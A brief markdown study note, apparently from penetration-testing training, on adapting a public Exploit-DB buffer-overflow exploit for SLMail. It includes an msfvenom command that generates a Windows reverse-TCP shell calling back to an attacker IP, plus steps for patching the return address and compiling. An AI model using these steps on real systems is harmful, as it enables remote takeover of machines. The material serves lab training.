# Public Exploits

---- REMEMBER NOT TO USE CODE WITHOUT CHECKING IT THROUGHLY FIRST -----

## Sources
* [Security Focus](http://securityfocus.com/)
* [Exploit DB](https://www.exploit-db.com/)
* Searchsploit `searchsploit slmail`

## Cleaning a Exploit (1)
1. Find the exploit using `searchsploit slmail`

2. Copy the file to your working folder `cp /usr/share/exploitdb/platforms/windows/remote/643.c .`

3. Open the file and check it line by line, looking for return addresses and shellcode inparticular, the results can be seen in `643-fixed.c`

   - Return address is incorrect and from the comments is for a different server, change `define retadd "\x9f\x45\x3a\x77" /*win2k server sp4 0x773a459f*/
   ` to `define retadd "\x8f\x35\x4a\x5f" /*JMP ESP*/`
   - The hardcoded shell code isn't for our enviroment so we will need to swap that out to the one we generated `msfvenom -p windows/shell_reverse_tcp LHOST=YO.UR.IP.AD LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
   - The offsets also need to be adjusted

4. Then compile using `gcc 643.c -o slmail-linux`

5. Then test our exploit as we did in the linux buffer overflow exercise

## Cleaning a Exploit (2)

